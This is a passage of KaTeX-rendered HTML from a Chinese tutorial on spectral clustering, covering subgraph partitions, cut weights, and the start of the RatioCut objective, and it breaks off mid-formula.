mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，它们满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>∩</mo><msub><mi>A</mi><mi>j</mi></msub><mo>=</mo><mo>⊘</mo></mrow><annotation encoding="application/x-tex">A_i∩A_j=⊘</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊘</span></span></span></span>，且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>A</mi><mn>2</mn></msub><mo>…</mo><mo>∪</mo><msub><mi>A</mi><mi>k</mi></msub><mo>=</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">A_1∪A_2…∪A_k=V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span></span></span></span></p><p>对于任意两个子图点的集合<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo>⊂</mo><mi>V</mi><mo separator="true">,</mo><mi>A</mi><mo>∩</mo><mi>B</mi><mo>=</mo><mo>⊘</mo></mrow><annotation encoding="application/x-tex">A,B⊂V,A∩B=⊘</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊘</span></span></span></span>，我们定义A和B之间的切图权重为：<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∑</mo><mrow><mi>i</mi><mo>∈</mo><mi>A</mi><mo separator="true">,</mo><mi>j</mi><mo>∈</mo><mi>B</mi></mrow></msub><msub><mi>w</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">W(A,B)=\sum_{i\in A,j\in B}w_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><br>那么对于，k个子图的集合<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>A</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">A_1,A_2,...,A_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，定义切图<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>u</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">cut</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span></span></span></span>为：<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>u</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>A</mi><mi>k</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><mi>W</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mover accent="true"><msub><mi>A</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">cut(A_1,A_2,...,A_k)=\frac{1}{2}\sum_{i=1}^k W(A_i,\hat{A_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3340079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>A</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{A_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0967699999999998em;vertical-align:-0.15em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的补集</p><h2 id="ratiocut切图">RatioCut切图</h2><p>RatioCut切图为了避免上述最小切图，对每个切图不光考虑最小化<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>u</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>A</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">cut(A_1,A_2,…,A_k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，它还同时考虑最大化每个子图点的个数，即：<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>C</mi><mi>u</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>A</mi><mi>k</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><mfrac><mrow><mi>W</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mover accent="true"><msub><mi>A</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><mrow><mo stretchy="false">∣</mo><msub><mi>A</mi><mi>i</mi></msub><mo stretchy="false">∣</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">RatioCut(A_1,A_2,…,A_k)=\frac{1}{2}∑_{i=1}^k \frac{W(A_i,\hat{A_i})}{\lvert A_i \rvert}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6677389999999999em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 